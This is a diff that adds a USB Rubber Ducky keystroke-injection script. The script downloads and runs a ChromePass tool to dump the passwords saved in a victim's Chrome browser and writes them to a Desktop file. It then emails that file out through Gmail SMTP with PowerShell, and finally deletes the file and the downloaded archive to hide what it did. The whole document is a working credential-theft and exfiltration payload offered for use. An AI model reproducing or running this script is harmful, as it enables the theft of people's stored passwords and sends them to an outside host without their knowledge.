@@ -1,0 +1,122 @@
+REM -------------Downlaoad ChromePass.exe and Run ChromePass.exe and save it
+DELAY 1000
+GUI r
+DELAY 200
+STRING Chrome
+DELAY 300
+ENTER
+DELAY 500
+GUI r
+DELAY 200
+STRING Chrome
+DELAY 200
+ENTER
+DELAY 400
+STRING link to program
+DELAY 200
+ENTER
+DELAY 4000
+ALT F4
+DELAY 500
+ALT F4
+DELAY 500
+GUI r
+DELAY 200
+STRING C:\Users\%Username%\Downloads\Chrompass.rar
+DELAY 700
+ENTER
+DELAY 700
+DOWN
+DOWN
+DELAY 200
+ENTER
+DELAY 1400
+CTRL a
+DELAY 400
+CTRL s
+DELAY 400
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 400
+ENTER
+DEL 200
+STRING C:\Users\%Username%\Desktop
+DELAY 300
+ENTER
+DELAY 300
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+STRING PASSWORD
+DELAY 300
+ENTER
+DELAY 400
+ALT F4
+DELAY 300
+ALT F4
+DELAY 300
+ALT F4
+REM -------------email log via gmail
+DELAY 400
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('you@gmail.com', 'gmail password');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'from gmail@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('to gmail@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'Ducky chrome passwords'
+ENTER
+STRING $ReportEmail.Body = 'Attached is your list of passwords.'
+ENTER
+STRING $ReportEmail.Attachments.Add('Desktop\PASSWORD.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 400
+STRING exit
+DELAY 400
+ENTER
+DELAY 400
+REM -------------delete the file
+DELAY 300
+GUI r
+DELAY 200
+STRING powershell Start-Process cmd -Verb runAs
+DELAY 200
+ENTER
+DELAY 1200
+TAB
+TAB
+TAB
+ENTER
+DELAY 600
+STRING del C:\Users\%Username%\Desktop\PASSWORD.txt
+ENTER
+DELAY 400
+STRING DEL C:\Users\%Username%\Downloads\Chrompass.rar
+DELAY 300
+ENTER
+DELAY 300
+STRING exit
+DELAY 200
+ENTER
